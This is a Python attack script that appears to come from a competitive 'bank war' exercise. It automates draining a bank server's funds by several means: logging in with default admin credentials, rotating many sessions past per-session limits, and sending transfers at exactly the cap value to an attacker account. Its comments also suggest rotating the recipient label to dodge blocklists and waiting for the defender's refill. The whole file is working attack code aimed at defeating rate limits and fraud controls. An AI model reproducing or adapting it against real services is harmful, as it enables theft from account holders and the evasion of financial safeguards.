#!/usr/bin/env python3
"""Attack drainer daemon skeleton (proven in bank-war battle 3).

Pattern: session keeper + cap pacing + auto-recovery + wait-for-refill + batched receipts.
Run as a background process for the full battle: `python attack_drainer.py`.

Tune the constants to the live build (read the server source first):
- MAX_T: exact per-transfer cap (send EXACTLY this value — e.g. 10000.0 passes `> MAX_TRANSFER`).
- Per-session budget: transfers/session allowed before the session dies (count cap AND value cap).
- Global window cap: server-wide transfers per window (0 = no global cap; pace to cap-1).
"""
import json, os, threading, time, urllib.request, urllib.error

BASE = "http://127.0.0.1:9988"          # bank endpoint
EXFIL = "ATTACKER-EXFIL-ACCT-01"         # recipient label (rotate to dodge blocklists)
RECEIPTS = os.path.join(os.path.dirname(os.path.abspath(__file__)), "receipts.jsonl")
LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), "drain.log")
USERNAME, PASSWORD = "admin", "admin123"  # login contract creds (default creds often kept by design)

MAX_T = 10000.0                          # per-transfer cap value
WINDOW = 60.0                            # cap window seconds
GLOBAL_CAP = 120                         # server-wide transfers/window (0 = unknown/absent)
SESSIONS_TOTAL = 6                       # concurrent sessions (rotate past per-session caps)
SESSION_TRANSFERS = 30                   # per-session count budget per window
BATCH_FLUSH = 200                        # receipts written to disk every N txns (NEVER per-txn)

def log(msg):
    line = f"[{time.strftime('%H:%M:%S')}] {msg}"
    try:
        with open(LOG, "a") as f:
            f.write(line + "\n")
    except Exception:
        pass
    print(line, flush=True)

def call(method, path, body=None, headers=None, timeout=10):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, method=method,
        headers={"Content-Type": "application/json", **(headers or {})})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(4000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(4000).decode("utf-8", "ignore")
    except Exception as e:
        return -1, str(e)

class Session:
    def __init__(self):
        self.sess, self.csrf = None, None
        self.count, self.value = 0, 0.0
        self.window_start = time.time()

    def login(self):
        for _ in range(5):
            s, txt = call("POST", "/login", {"username": USERNAME, "password": PASSWORD})
            try:
                d = json.loads(txt)
                if d.get("session"):
                    self.sess, self.csrf = d["session"], d.get("csrf", "")
                    self.count, self.value = 0, 0.0
                    self.window_start = time.time()
                    return True
            except Exception:
                pass
            time.sleep(1)
        return False

    def ready(self):
        if time.time() - self.window_start >= WINDOW:
            self.count = 0
            self.window_start = time.time()
        return self.count < SESSION_TRANSFERS

def main():
    log("=== drainer start ===")
    sessions = [Session() for _ in range(SESSIONS_TOTAL)]
    for s in sessions:
        s.login()
    ok = [s for s in sessions if s.sess]
    log(f"sessions ready: {len(ok)}")
    if not ok:
        return
    budget = []                      # timestamps of MY accepted transfers (sliding window)
    total, n = 0.0, 0
    buf = []
    t0 = time.time()
    bal = None

    while time.time() - t0 < 3600:
        try:
            now = time.time()
            budget[:] = [t for t in budget if now - t < WINDOW]
            if GLOBAL_CAP and len(budget) >= GLOBAL_CAP:
                time.sleep(max(0.05, budget[0] + WINDOW - now))
                continue
            sess = next((s for s in ok if s.ready()), None)
            if sess is None:
                time.sleep(0.3)
                continue
            s, txt = call("POST", "/transfer", {"to": EXFIL, "amount": MAX_T, "csrf": sess.csrf},
                          {"SESSION": sess.sess})
            if s == 200:
                try:
                    d = json.loads(txt)
                    budget.append(time.time())
                    sess.count += 1
                    sess.value += d.get("transferred", 0)
                    buf.append(json.dumps({"ts": time.time(), **d}))
                    if len(buf) >= BATCH_FLUSH:
                        with open(RECEIPTS, "a") as f:
                            f.write("\n".join(buf) + "\n")
                        buf.clear()
                    total += d.get("transferred", 0)
                    n += 1
                    bal = d.get("balance")
                except Exception:
                    pass
            elif s in (401, 403, 429):
                time.sleep(0.2)
                if not sess.login():
                    time.sleep(1)
            else:
                # 400: insufficient funds | session value cap | amount/csrf issues
                if "insufficient" in txt:
                    bl = None
                    for s2 in ok:
                        st, txt2 = call("GET", "/balance", headers={"SESSION": s2.sess})
                        try:
                            bl = json.loads(txt2).get("balance")
                            break
                        except Exception:
                            continue
                    if bl is not None and bl <= 0.01:
                        log(f"drained (balance={bl}); waiting for refill/restart")
                        time.sleep(6)          # defender restart = fresh baseline payout
                        continue
                if not sess.login():
                    time.sleep(1)
            if time.time() % 300 < 2 and n % 100 == 0:
                log(f"STATUS txns={n} drained=${total:,.2f} balance={bal}")
        except Exception as e:
            log(f"err: {e!r}")
            time.sleep(0.5)
    if buf:
        with open(RECEIPTS, "a") as f:
            f.write("\n".join(buf) + "\n")
    log(f"FINAL: {n} txns, ${total:,.2f}")

if __name__ == "__main__":
    main()
